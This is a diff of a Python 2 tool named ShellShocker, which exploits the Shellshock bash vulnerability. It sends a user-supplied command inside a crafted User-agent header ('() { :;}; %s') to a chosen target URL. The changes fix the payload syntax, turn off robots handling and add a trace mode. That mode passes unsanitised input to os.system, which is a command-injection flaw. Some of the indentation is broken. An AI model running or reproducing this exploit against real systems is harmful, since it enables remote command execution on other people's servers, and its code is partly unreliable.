@@ -1,4 +1,4 @@
-#! /usr/bin/python
+#! /usr/bin/python2.7
 #qpy:console
 
 ####################################         /&/
@@ -14,13 +14,20 @@
 # Status: initial release
 # support: posix (Unix) / Windows may require Cygwin[BATCH NOT SUPPORTED] due to unsupported things. Program runs.
 # Be free! Open Source <(C)
-# Version: 1.2
+# Version: 1.3
 # Status: Stable
 
 #Modules
 import os
 import sys
-
+try:
+    import urllib2
+except ImportError:
+    pass # it is not needed for correctly use but if exception happens
+         # user will see stack trace
+    print("{!!}Urllib2 is not installed")
+    print("{+} But you can use Shellshocker")
+    raw_input("Press any key to continue...")
 # Sys.Argv -- argument parser
 len(sys.argv)
 
@@ -42,7 +49,7 @@ i ADVIDSED you.
 :::.::.:::.::.:..::.::::.....:::..:::.
 ========================================\033[0m
 '''
-version = "1.2"
+version = "1.3"
 status = "Stable"
 
 __main__ = '''
@@ -73,12 +80,13 @@ ShellShocker <(C) | Exploit (Shell)
       \033[34mDeveloper: Stefano Belli (--developer for more info(s) )
       Script version: %s
       GitHub: <http://github.com/StefanoBelli/shellshocker-python>Term
-      Last updated: 14/02/2015 [DD/MM/YYYY] @ 04:05 AM\033[0m
+      Last updated: 21/02/2015 [DD/MM/YYYY] @  12:42 PM\033[0m
 
 Usage: shellshocker.py \033[33m<option>
 
-options: --licence
-         --developer\033[0m
+options: --warn
+         --developer
+         --trace\033[0m
       
 
 ''' %version
@@ -113,21 +121,25 @@ _retry_ = '''
 
 #Argument 
 for arg in sys.argv:
-    if arg == "--licence":
+    if arg == "--warn":
         os.system("clear")
-        print ""
+        print ("")
         print(_licence_)
-        print ""
+        print ("")
         exit(0)
     elif arg == "--developer":
-	os.system("clear")
-	print ""
-        print (_developer_)
-        print ""
-	exit(0)
-  
-        
-
+        os.system("clear")
+        print ("")
+        print(_developer_)
+        print ("")
+        exit(0)
+    elif arg == "--trace": 
+        os.system("clear")
+        print ("")
+        print ("ShellShocker <(C) | TraceTarget ")
+        typeTarget = raw_input("{>} Target URL/IP: ")
+        os.system("ping %s -t 5 "%typeTarget+"&& traceroute %s"%typeTarget+" || echo 'Not reachable. Aborting traceroute'")
+        exit(0)
 ################################ GO!
 try:
     #Check if mechanize is installed, if not let the user choose if he/she(dreams :D ) wants to get it
@@ -140,7 +152,7 @@ except ImportError:
     if outOrGet == 'e':
         exit(1)
         exitValue = 1
-	print("Bye\033[0m")
+	
     elif outOrGet == 'm':
         packageManager = raw_input("{?} What package manager are you using?[apt/yum/pacman]: ")
         if packageManager == 'apt':
@@ -184,19 +196,8 @@ except ImportError:
         import androidhelper
     except ImportError:
         print("[!} Supporting Android by QPython ~ TextualShell\n")
-        pass
-#Define mechanize values
-def defineMechanize():
-    global br
-    try:
-       br = mechanize.Browser()
-    except NameError:
-       print("\033[33m{!!} Mechanize was not installed. Run this script by: %s"%currentWorkDirectory)
-       exit(1)
-    br.addheaders = [('User-agent', '() {:;}; %s'%getCommand)]
-    br.set_handle_robots(false)
-    
-#Main screen 
+        pass 
+#Exploit Main menu 
 def mainChooser():
     global getTarget
     global getCommand
@@ -208,23 +209,24 @@ def mainChooser():
         print("")
         getCommand = raw_input("\033[33m{?/!!}sskr:type-Command# \033[0m")
         print("\033[32m{!!} Command: %s\033[0m"%getCommand)
+	 
     except KeyboardInterrupt:
         print("\n\033[33m{!} User quitted (while get data) \033[0m")
         exit(0)
     except SyntaxError:
-        print("\033[31m{!} Dev error! submit this error: mainChooser() SyntaxError [[ See my email address for more info (call --developer)\033[0m")
+        print("\033[31m{!} Dev error! submit this error: mainChooser() SyntaxError [[ See my email address for more info (call --developer by command line)\033[0m")
         exit(0)
         
 
 #Attack
 def attacker():
     try:
-        print ""
+        print ("")
         print("\033[31m{!!} All data acquired... Calling %s\033[0m"%getTarget)
         br.open(getTarget)
         response = br.response()
         if response:
-            print("\033[32m{+} Command: "%getCommand+" executed."%getTarget+" Was reachable\033[0m")
+            print("\033[32m{+} Command: %s"%getCommand+" executed. %s"%getTarget+" was reachable\033[0m")
             exit(0)
         else:
             print("\033[31m{!} Error(s) happened, but maybe command was executed by bash shell\033[0m")
@@ -236,24 +238,50 @@ def attacker():
     except KeyboardInterrupt:
         print("\033[33m{!} User quitted [function: attacker() ]")
         exit(0)
-    except mechanize._mechanize.BrowserStateError:
-      try:
-        	print("\033[31m{!} I cannot reach website.\033[0m")        
-        	retryOrNot = raw_input("\033[33m{?} Would you like to get back for retry?[Y/n]: \033[0m")
-        	if retryOrNot == 'y':
-           		os.system("clear")
-            	print (_retry_)
-                ###################
-            	mainChooser()
-            	defineMechanize()
-                attacker()
-                ###################
-      except KeyboardInterrupt:
-        	print("{!} User quitted!\n")
-          	exit(0)
-            
-####EXECUTE####
-mainChooser()     
-defineMechanize()  
-attacker()         
-###############
+    except mechanize._mechanize.BrowserStateError: #now working
+        print("")
+        print("{!!} Check syntax! ")
+        print("{!} Correct syntax should be: [ protocol://name.domain/dir/dir/ ]etc...")
+        print("{!} Remember that you must know if Bash shell handles request and variables")
+        retryOrNot = raw_input("{?>} What you want to do [r]etry/[e]xit? ")
+        if retryOrNot == 'r':
+            print("")
+            main()
+        else:
+            print("")
+            print("{!}Bye")
+            exit(0)
+    except urllib2.URLError:
+        print("")
+        print("{!!} Network is not reachable or target server is busy/not exists ")
+	print"{!} Or, robots.txt disallows your request.(Valid reason if you waited some seconds before to see this message)"	
+	print("{>}Try to open Shellshocker in '--trace' mode to ping and do a traceroute to the target.(Don't write protocol)")
+        whatYouWantToDoURLErrorUnReachable = raw_input("{>} What you want to do [r]etry/[e]xit ")
+    if whatYouWantToDoURLErrorUnReachable == 'r':
+            main()
+    elif whatYouWantToDoURLErrorUnReachable == 'e':
+            print("{!>}Exit")
+            exit(1)
+    else:
+            print("{!} Non-valid option ")
+            exit(1)
+
+       
+def main():
+	#MainChooser function
+	mainChooser()
+	#Mechanize Browser 
+	global br
+	try:
+   		br = mechanize.Browser()
+	except NameError:
+   		print("\033[33m{!!} Mechanize was not installed. Run this script by: %s"%currentWorkDirectory)
+   		exit(1)
+	br.addheaders = [('User-agent', '() { :;}; %s'%getCommand)] #fixed  
+	br.set_handle_robots("false") #not handling robots
+	#attacker function
+	attacker()
+
+
+#Main
+main()
